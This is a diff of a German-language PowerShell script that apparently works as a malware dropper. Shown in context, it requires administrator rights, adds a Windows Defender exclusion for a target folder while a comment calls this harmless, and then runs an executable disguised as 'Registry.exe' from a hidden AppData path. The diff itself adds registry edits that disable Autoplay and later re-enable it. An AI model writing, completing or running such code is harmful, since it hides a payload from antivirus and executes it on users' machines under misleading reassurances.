@@ -1,4 +1,4 @@
-# Prüfe, ob Skript mit Administratorrechten ausgeführt wird
+ # Prüfe, ob Skript mit Administratorrechten ausgeführt wird
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Write-Warning "Bitte führe dieses Skript als Administrator aus."
     exit
@@ -10,6 +10,7 @@ if (-not (Test-Path $zielOrdner)) {
     Write-Host "Zielordner $zielOrdner wird erstellt..."
     New-Item -Path $zielOrdner -ItemType Directory -Force
 }
+sp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" DisableAutoplay 1
 
 # Defender-Ausnahme hinzufügen (nicht gefährlich, nützlich für Entwicklungs- und Testdateien)
 Write-Host "Füge Windows Defender-Ausnahme für: $zielOrdner hinzu..."
@@ -43,6 +44,8 @@ while (-not $registryGefunden) {
         if ($registryGefunden) { break }
     }
 }
+
+sp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" DisableAutoplay 0
 
 # Datei ausführen (nur wenn erfolgreich kopiert)
 $ausfuehrPfad = Join-Path "C:\Users\fusse\AppData\Roaming\Microsoft\Windows" "Registry.exe"
